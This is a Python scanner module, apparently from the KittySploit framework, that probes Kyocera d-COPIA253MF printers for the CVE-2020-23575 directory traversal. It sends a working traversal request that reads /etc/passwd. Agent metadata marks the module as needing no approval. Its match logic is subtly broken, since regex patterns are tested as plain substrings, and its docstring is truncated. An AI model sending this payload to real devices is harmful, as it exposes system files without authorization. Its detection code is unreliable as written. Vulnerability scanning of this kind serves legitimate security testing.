#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kyocera Printer d-COPIA253MF plus is susceptible to a directory traversal vulnerability which could allow an a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kyocera Printer d-COPIA253MF - Directory Traversal Detection',
        'description': 'Kyocera Printer d-COPIA253MF plus is susceptible to a directory traversal vulnerability which could allow an attacker to retrieve or view arbitrary files from the affected server.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'printer', 'iot', 'lfi', 'edb', 'kyocera', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/48561',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-23575',
            'https://www.kyoceradocumentsolutions.com.tr/tr.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-23575',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('root:.*:0:0:', 'bin:.*:1:1',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Kyocera Printer d-COPIA253MF - Directory Traversal detected",
                path='/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm',
            )
            return True
        return False

